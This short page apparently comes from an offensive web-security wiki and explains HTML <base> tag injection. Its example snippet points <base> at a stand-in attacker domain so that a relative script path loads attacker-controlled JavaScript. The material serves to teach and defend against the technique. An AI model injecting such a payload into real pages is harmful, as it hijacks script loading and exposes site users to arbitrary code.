# Overview

The HTML [&lt;base&gt;](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base) element specifies the base URL to use for all relative URLs in a document.

{% hint style="info" %}
If multiple &lt;base&gt; elements are used, only the first href and first target are obeyed — all others are ignored.
{% endhint %}

# Relative URL redirection

`<base>` tag injection allows redirecting relative URLs to an arbitrary host.

For example, for the following page, the browser will request a script from `https://attacker-website.com/assets/some-script.js`.

```html
<base href="https://attacker-website.com">

<script src="/assets/some-script.js"></script>
```

In other words, if there is a way to inject the `<base>` tag it is possible to inject arbitrary JavaScipt code to the `<scripts>` elements that download scripts using relative URLs.
